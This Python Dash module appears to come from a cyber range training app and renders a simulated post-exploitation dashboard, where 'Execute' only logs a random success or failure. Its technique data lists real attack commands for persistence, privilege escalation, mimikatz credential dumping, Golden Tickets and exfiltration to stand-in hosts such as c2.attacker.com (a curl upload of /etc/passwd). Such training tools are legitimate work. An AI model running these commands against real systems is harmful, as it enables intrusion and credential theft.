"""
ui_postex.py — Post-Exploitation Command Center
================================================
Premium tactical module covering the full post-exploitation kill chain:
  Phase 1: Persistence Mechanisms
  Phase 2: Privilege Escalation
  Phase 3: Lateral Movement
  Phase 4: Credential Dumping
  Phase 5: Exfiltration
"""
from dash import html, dcc, Input, Output, State, callback, ctx, no_update, ALL
from dash.exceptions import PreventUpdate
import dash_bootstrap_components as dbc
import dash_cytoscape as cyto
import time, random

from cyber_range.services.simulation_engine import engine

# ── Design tokens ──────────────────────────────────────────────────────────────
_DARK   = "#0a0d14"
_CARD   = "#0f1420"
_BORDER = "#1e2a3a"
_GOLD   = "#ffd700"
_CYAN   = "#00c8ff"
_GREEN  = "#00ff88"
_RED    = "#ff3355"
_ORANGE = "#ff8c00"
_PURPLE = "#cc44ff"
_DIM    = "#4a5568"
_BLUE   = "#1565c0"

# ── Post-exploitation phases ───────────────────────────────────────────────────
_PHASES = [
    {
        "id": "persistence",
        "label": "Persistence",
        "icon": "🔒",
        "color": "#f44336",
        "mitre": "TA0003",
        "techniques": [
            {"id": "T1053.005", "name": "Scheduled Task",        "cmd": "schtasks /create /tn 'AegisBeacon' /tr 'C:\\beacon.exe' /sc minute /mo 5"},
            {"id": "T1547.001", "name": "Registry Run Keys",      "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Aegis /t REG_SZ /d C:\\beacon.exe"},
            {"id": "T1543.003", "name": "Windows Service",        "cmd": "sc create AegisSvc binPath= C:\\svc.exe start= auto"},
            {"id": "T1136.001", "name": "Create Local Account",   "cmd": "net user aegis P@ssw0rd123! /add && net localgroup administrators aegis /add"},
            {"id": "T1078",     "name": "Valid Account Hijack",   "cmd": "net user administrator /active:yes"},
        ],
    },
    {
        "id": "privesc",
        "label": "Privilege Escalation",
        "icon": "⬆",
        "color": "#e91e63",
        "mitre": "TA0004",
        "techniques": [
            {"id": "T1068",     "name": "PrintNightmare (CVE-2021-1675)", "cmd": "Invoke-Nightmare -NewUser 'aegis' -NewPassword 'P@ssw0rd!'"},
            {"id": "T1546.008","name": "Accessibility Feature (sethc)",   "cmd": "copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"},
            {"id": "T1055",     "name": "Process Injection",               "cmd": "Invoke-ReflectivePEInjection -PEPath C:\\payload.dll -ProcessName lsass"},
            {"id": "T1134",     "name": "Token Impersonation",             "cmd": "Invoke-TokenManipulation -ImpersonateUser -Username 'SYSTEM'"},
            {"id": "T1574.002", "name": "DLL Side-Loading",                "cmd": "copy malicious.dll C:\\Program Files\\VulnApp\\legit.dll"},
        ],
    },
    {
        "id": "lateral",
        "label": "Lateral Movement",
        "icon": "↔",
        "color": "#2196f3",
        "mitre": "TA0008",
        "techniques": [
            {"id": "T1550.002", "name": "Pass-the-Hash (PtH)",     "cmd": "sekurlsa::pth /user:Administrator /ntlm:<hash> /run:cmd.exe"},
            {"id": "T1558.003", "name": "Kerberoasting",            "cmd": "Invoke-Kerberoast -OutputFormat Hashcat | fl"},
            {"id": "T1021.001", "name": "Remote Desktop (RDP)",     "cmd": "mstsc /v:192.168.1.10 /f"},
            {"id": "T1021.002", "name": "SMB/Admin Shares",         "cmd": "net use \\\\DC01\\C$ /user:DOMAIN\\Administrator <password>"},
            {"id": "T1558.001", "name": "Golden Ticket",            "cmd": "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash>"},
        ],
    },
    {
        "id": "creds",
        "label": "Credential Dumping",
        "icon": "🔑",
        "color": "#673ab7",
        "mitre": "TA0006",
        "techniques": [
            {"id": "T1003.001", "name": "LSASS Memory Dump",        "cmd": "sekurlsa::logonpasswords"},
            {"id": "T1003.002", "name": "SAM Database Dump",         "cmd": "reg save HKLM\\SAM C:\\temp\\sam.hiv && reg save HKLM\\SYSTEM C:\\temp\\sys.hiv"},
            {"id": "T1003.003", "name": "NTDS.dit Extraction",       "cmd": "ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\temp\\ntds' q q"},
            {"id": "T1555",     "name": "Browser Credential Theft",  "cmd": "Invoke-SharpChrome -- cookies --format=json"},
            {"id": "T1552.001", "name": "Find Credentials in Files", "cmd": "findstr /si 'password' *.txt *.xml *.ini *.config"},
        ],
    },
    {
        "id": "exfil",
        "label": "Exfiltration",
        "icon": "📤",
        "color": "#8bc34a",
        "mitre": "TA0010",
        "techniques": [
            {"id": "T1048.003", "name": "DNS Tunneling",            "cmd": "iodine -f -P password dns.c2.attacker.com"},
            {"id": "T1048.002", "name": "HTTPS C2 Exfil",          "cmd": "curl -X POST https://c2.attacker.com/upload -F 'file=@/etc/passwd'"},
            {"id": "T1567.002", "name": "Exfil to Cloud Storage",  "cmd": "aws s3 cp C:\\sensitive.zip s3://attacker-bucket/"},
            {"id": "T1020",     "name": "Scheduled Exfiltration",   "cmd": "schtasks /create /tn 'DailyExfil' /tr 'powershell.exe -c ...' /sc daily /st 02:00"},
            {"id": "T1041",     "name": "C2 Channel Transfer",      "cmd": "upload C:\\data.zip /home/attacker/loot/"},
        ],
    },
]

# ── Simulation log ─────────────────────────────────────────────────────────────
_POSTEX_LOG: list[str] = []


def _log(msg: str, level: str = "INFO"):
    ts = time.strftime("%H:%M:%S")
    _POSTEX_LOG.append(f"[{ts}] [{level}] {msg}")
    _POSTEX_LOG[:] = _POSTEX_LOG[-200:]


def _render_log():
    entries = []
    for line in _POSTEX_LOG[-60:]:
        color = (_GREEN  if "SUCCESS" in line or "✅" in line else
                 _RED    if "FAIL" in line or "❌" in line or "CRITICAL" in line else
                 _ORANGE if "WARN" in line or "⚠" in line else
                 _CYAN)
        entries.append(html.Div(line, style={
            "color": color, "fontSize": "10px",
            "fontFamily": "monospace", "padding": "1px 0",
            "borderBottom": f"1px solid {_BORDER}22",
        }))
    return entries or [html.Div("— Awaiting execution —", style={"color": _DIM, "fontStyle": "italic"})]


# ── Stats strip ────────────────────────────────────────────────────────────────
def _stat_box(label, value, color=_CYAN):
    return html.Div([
        html.Div(str(value), style={
            "color": color, "fontSize": "22px", "fontWeight": "900",
            "fontFamily": "monospace",
        }),
        html.Div(label, style={
            "color": _DIM, "fontSize": "9px", "letterSpacing": "1px",
            "textTransform": "uppercase", "marginTop": "2px",
        }),
    ], style={
        "background": _CARD, "border": f"1px solid {_BORDER}",
        "borderTop": f"2px solid {color}",
        "borderRadius": "8px", "padding": "10px 14px",
        "textAlign": "center", "flex": "1",
    })


# ── Phase selector buttons ─────────────────────────────────────────────────────
def _phase_strip():
    buttons = []
    for ph in _PHASES:
        buttons.append(
            dbc.Button(
                [html.Span(ph["icon"], style={"marginRight": "6px"}), ph["label"]],
                id=f"postex-phase-{ph['id']}",
                size="sm",
                style={
                    "background": f"{ph['color']}22",
                    "border": f"1px solid {ph['color']}66",
                    "color": ph["color"],
                    "fontSize": "11px", "fontWeight": "700",
                    "letterSpacing": "0.5px", "marginRight": "8px",
                    "borderRadius": "6px",
                },
            )
        )
    return html.Div(buttons, style={"display": "flex", "flexWrap": "wrap", "gap": "6px", "marginBottom": "20px"})


# ── Technique card ─────────────────────────────────────────────────────────────
def _technique_card(tech: dict, phase: dict) -> html.Div:
    return html.Div([
        # Header
        html.Div([
            html.Span(tech["id"], style={
                "color": phase["color"], "fontSize": "9px", "fontWeight": "900",
                "fontFamily": "monospace", "letterSpacing": "1px",
                "background": f"{phase['color']}22",
                "border": f"1px solid {phase['color']}44",
                "padding": "2px 8px", "borderRadius": "4px",
            }),
            html.Span(tech["name"], style={
                "color": "#ddd", "fontSize": "12px", "fontWeight": "700",
                "marginLeft": "10px",
            }),
        ], style={"display": "flex", "alignItems": "center", "marginBottom": "10px"}),

        # Command block
        html.Pre(tech["cmd"], style={
            "background": _DARK, "border": f"1px solid {_BORDER}",
            "borderRadius": "6px", "padding": "10px", "margin": "0 0 10px 0",
            "fontFamily": "monospace", "fontSize": "10px",
            "color": _GREEN, "overflowX": "auto",
            "whiteSpace": "pre-wrap", "wordBreak": "break-all",
        }),

        # Run button
        html.Div([
            dbc.Button(
                [html.Span("▶ Execute", style={"fontSize": "11px"})],
                id={"type": "postex-run-tech", "index": tech["id"]},
                color="danger", size="sm",
                style={"fontSize": "11px", "fontWeight": "700",
                       "marginRight": "8px"},
            ),
            dbc.Button(
                "📋 Copy",
                id={"type": "postex-copy-tech", "index": tech["id"]},
                color="secondary", size="sm",
                style={"fontSize": "11px"},
            ),
        ]),
    ], style={
        "background": _CARD, "border": f"1px solid {_BORDER}",
        "borderLeft": f"3px solid {phase['color']}",
        "borderRadius": "8px", "padding": "14px",
        "marginBottom": "12px",
    })


# ── Lateral movement graph ─────────────────────────────────────────────────────
def _lateral_graph():
    from cyber_range.services.neo4j_mock import _HOSTS
    elements = []
    for i, h in enumerate(_HOSTS[:8]):
        comp = h.get("compromised", False)
        elements.append({"data": {
            "id": h["ip"],
            "label": f"{h.get('hostname', h['ip'])}\n{h['ip']}",
            "state": "COMPROMISED" if comp else "PENDING",
            "os": h.get("os", "Unknown"),
        }})
    # Add some edges
    ips = [h["ip"] for h in _HOSTS[:8]]
    pairs = [(ips[0], ips[1]), (ips[1], ips[2]), (ips[1], ips[4]),
             (ips[2], ips[3]), (ips[3], ips[6])]
    for src, tgt in pairs:
        elements.append({"data": {"source": src, "target": tgt, "label": "CONNECTED"}})
    return elements


_LATERAL_STYLE = [
    {"selector": "node", "style": {
        "label": "data(label)", "color": "#ccc",
        "background-color": "#1a2030", "border-color": "#2a3a50",
        "border-width": 2, "font-size": "9px", "font-family": "monospace",
        "width": "70px", "height": "70px", "shape": "ellipse",
        "text-valign": "center", "text-halign": "center",
        "text-wrap": "wrap", "text-max-width": "65px",
    }},
    {"selector": "node[state='COMPROMISED']", "style": {
        "background-color": "#ff335522", "border-color": "#ff3355",
        "border-width": 3, "color": "#ff3355", "font-weight": "bold",
    }},
    {"selector": "edge", "style": {
        "line-color": "#2a3a50", "target-arrow-color": "#2a3a50",
        "target-arrow-shape": "triangle", "curve-style": "bezier", "width": 2,
    }},
]


# ── Main layout ────────────────────────────────────────────────────────────────
def postex_layout():
    return html.Div([
        dcc.Store(id="postex-active-phase", data="persistence"),
        dcc.Interval(id="postex-log-refresh", interval=2000, n_intervals=0),

        # ── Header ──────────────────────────────────────────────────────────
        html.Div([
            html.Div([
                html.Div("💀  POST-EXPLOITATION COMMAND CENTER", style={
                    "color": _RED, "fontSize": "11px", "fontWeight": "900",
                    "letterSpacing": "3px", "fontFamily": "monospace",
                }),
                html.Div("MITRE ATT&CK · Persistence · PrivEsc · Lateral Movement · Exfiltration", style={
                    "color": _DIM, "fontSize": "12px", "marginTop": "2px",
                }),
            ]),
            html.Div([
                html.Span("⬤", style={"color": _RED, "marginRight": "6px", "fontSize": "10px"}),
                html.Span("ACTIVE", style={"color": _RED, "fontSize": "11px",
                                            "fontWeight": "700", "fontFamily": "monospace"}),
            ], style={
                "display": "flex", "alignItems": "center",
                "background": f"{_RED}22", "border": f"1px solid {_RED}44",
                "borderRadius": "20px", "padding": "6px 14px",
            }),
        ], style={
            "display": "flex", "justifyContent": "space-between", "alignItems": "center",
            "marginBottom": "24px", "borderBottom": f"2px solid {_RED}33",
            "paddingBottom": "16px",
        }),

        # ── Stats strip ─────────────────────────────────────────────────────
        html.Div([
            _stat_box("Compromised Hosts", "2",  _RED),
            _stat_box("Techniques Run",    "0",  _ORANGE, ),
            _stat_box("Creds Dumped",      "0",  _PURPLE),
            _stat_box("Lateral Pivots",    "0",  _BLUE   if False else _CYAN),
            _stat_box("Exfil Volume",      "0 B",_GREEN),
        ], id="postex-stat-row",
        style={"display": "flex", "gap": "12px", "marginBottom": "24px"}),

        # ── Phase selector ──────────────────────────────────────────────────
        html.Div("SELECT PHASE", style={
            "color": _DIM, "fontSize": "9px", "fontWeight": "700",
            "letterSpacing": "1px", "marginBottom": "10px",
        }),
        _phase_strip(),

        # ── Main content: Technique panel + lateral graph ────────────────
        dbc.Row([
            dbc.Col([
                html.Div(id="postex-technique-panel", children=[
                    html.Div("Select a phase above to load techniques.",
                             style={"color": _DIM, "fontStyle": "italic", "padding": "20px"})
                ]),
            ], width=7),
            dbc.Col([
                # Lateral movement graph
                html.Div([
                    html.Div("⬡  NETWORK TOPOLOGY — LATERAL MOVEMENT PATHS", style={
                        "color": _CYAN, "fontSize": "9px", "fontWeight": "900",
                        "letterSpacing": "2px", "fontFamily": "monospace", "marginBottom": "10px",
                    }),
                    cyto.Cytoscape(
                        id="postex-lateral-graph",
                        layout={"name": "cose", "nodeSpacing": 60, "animate": True},
                        style={"width": "100%", "height": "300px",
                               "background": _DARK, "borderRadius": "8px",
                               "border": f"1px solid {_BORDER}"},
                        stylesheet=_LATERAL_STYLE,
                        elements=_lateral_graph(),
                    ),
                ], style={
                    "background": _CARD, "border": f"1px solid {_BORDER}",
                    "borderRadius": "10px", "padding": "14px", "marginBottom": "16px",
                }),

                # Execution log
                html.Div([
                    html.Div("⚡ EXECUTION LOG", style={
                        "color": _RED, "fontSize": "9px", "fontWeight": "900",
                        "letterSpacing": "2px", "fontFamily": "monospace", "marginBottom": "10px",
                    }),
                    html.Div(id="postex-log-panel", style={
                        "background": _DARK, "border": f"1px solid {_BORDER}",
                        "borderRadius": "8px", "padding": "12px",
                        "minHeight": "220px", "maxHeight": "300px",
                        "overflowY": "auto", "fontFamily": "monospace", "fontSize": "10px",
                    }, children=_render_log()),
                    dbc.Button("🗑 Clear Log", id="postex-clear-log",
                               color="secondary", size="sm",
                               style={"marginTop": "8px", "fontSize": "10px"}),
                ], style={
                    "background": _CARD, "border": f"1px solid {_BORDER}",
                    "borderRadius": "10px", "padding": "14px",
                }),
            ], width=5),
        ]),

    ], style={
        "background": _CARD, "minHeight": "100vh",
        "padding": "24px", "fontFamily": "'Inter', monospace",
    })


# ── Callbacks ──────────────────────────────────────────────────────────────────
def register_callbacks(app):

    @app.callback(
        Output("postex-technique-panel", "children"),
        Output("postex-active-phase", "data"),
        [Input(f"postex-phase-{ph['id']}", "n_clicks") for ph in _PHASES],
        prevent_initial_call=False,
    )
    def show_techniques(*clicks):
        trigger = ctx.triggered_id
        active_id = "persistence"
        if trigger and trigger.startswith("postex-phase-"):
            active_id = trigger.replace("postex-phase-", "")

        phase = next((p for p in _PHASES if p["id"] == active_id), _PHASES[0])
        cards = [
            html.Div([
                html.Span(phase["icon"], style={"fontSize": "18px", "marginRight": "10px"}),
                html.Span(phase["label"], style={"color": phase["color"], "fontSize": "14px", "fontWeight": "900"}),
                html.Span(f" · MITRE {phase['mitre']}", style={"color": _DIM, "fontSize": "10px", "marginLeft": "8px"}),
            ], style={"marginBottom": "16px"}),
        ]
        for tech in phase["techniques"]:
            cards.append(_technique_card(tech, phase))
        return html.Div(cards, style={
            "background": _CARD, "border": f"1px solid {_BORDER}",
            "borderRadius": "10px", "padding": "16px",
        }), active_id

    @app.callback(
        Output("postex-log-panel", "children"),
        Input("postex-log-refresh", "n_intervals"),
        Input("postex-clear-log", "n_clicks"),
        prevent_initial_call=False,
    )
    def refresh_log(_, clear_clicks):
        if ctx.triggered_id == "postex-clear-log":
            _POSTEX_LOG.clear()
            _log("Log cleared.", "SYSTEM")
        return _render_log()

    @app.callback(
        Output("postex-log-panel", "children", allow_duplicate=True),
        Input({"type": "postex-run-tech", "index": ALL}, "n_clicks"),
        State("postex-active-phase", "data"),
        prevent_initial_call=True,
    )
    def run_technique(clicks, active_phase):
        if not any(c for c in clicks if c):
            raise PreventUpdate
        trigger = ctx.triggered_id
        if not trigger:
            raise PreventUpdate
        tech_id = trigger.get("index", "")
        phase = next((p for p in _PHASES if p["id"] == active_phase), _PHASES[0])
        tech = next((t for t in phase["techniques"] if t["id"] == tech_id), None)
        if not tech:
            raise PreventUpdate

        _log(f"Executing technique {tech_id}: {tech['name']}", "ATTACK")
        # Simulate execution with random success/fail
        import time, random
        time.sleep(0.1)
        roll = random.randint(1, 100)
        if roll <= 75:
            _log(f"✅ SUCCESS: {tech['name']} — execution completed (roll {roll}/75)", "SUCCESS")
            engine.log_event("POSTEX", f"✅ {tech['name']} executed successfully ({tech['id']})")
        else:
            _log(f"❌ FAILED: {tech['name']} — blocked/prevented (roll {roll}/75)", "ERROR")
            engine.log_event("POSTEX", f"❌ {tech['name']} failed ({tech['id']})")

        return _render_log()
